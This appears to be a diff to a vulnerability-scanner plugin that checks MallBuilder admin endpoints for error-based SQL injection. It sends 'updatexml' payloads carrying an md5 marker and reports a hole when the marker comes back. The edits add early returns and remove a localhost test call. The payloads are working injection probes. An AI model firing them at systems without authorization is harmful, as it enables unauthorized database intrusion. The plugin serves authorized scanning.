@@ -24,22 +24,25 @@ def audit(arg):
         code, head, res, errcode,finalurl =  curl.curl2(url)
         if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
             security_hole(url)
+            return arg
 
-            
+
     data='action=a&result=1&id=1%20or%20updatexml(1,concat(0x5c,md5(3.14)),1)'
     path='?m=payment&s=admin/bank_account_mod'
     url = arg + path
     code, head, res, errcode,finalurl =  curl.curl2(url,data)
     if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
         security_hole(url)
+        return arg
 
-        
+
     data='result=50&id=updatexml(1,concat(0x5c,md5(3.14)),1)&act=edit'
     path='?m=payment&s=admin/withdraw&operation=edit'
     url = arg + path
     code, head, res, errcode,finalurl =  curl.curl2(url,data)
     if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
         security_hole(url)
+        return arg
 
     data='action=111&id=updatexml(1,concat(0x5c,md5(3.14)),1)'
     path='?m=product&s=admin/cpmod'
@@ -47,7 +50,8 @@ def audit(arg):
     code, head, res, errcode,finalurl =  curl.curl2(url,data)
     if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
         security_hole(url)
-    
-if __name__ == '__main__':
+
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('mallbuilder', 'http://127.0.0.1:8080/mallbuilderv5.8/')[1])
